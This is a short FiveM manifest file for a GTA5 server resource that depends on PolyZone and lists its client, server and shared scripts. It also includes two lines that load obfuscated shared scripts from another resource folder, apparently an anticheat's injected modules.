shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

fx_version 'bodacious'
game 'gta5'
version '1.1.0'
dependencies {
    "PolyZone"
}
client_script {
    'client.lua',
	'@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    '@PolyZone/EntityZone.lua',
    '@PolyZone/CircleZone.lua',
    '@PolyZone/ComboZone.lua',
}
server_script {
	'server.lua',
}
shared_script 'shared.lua'
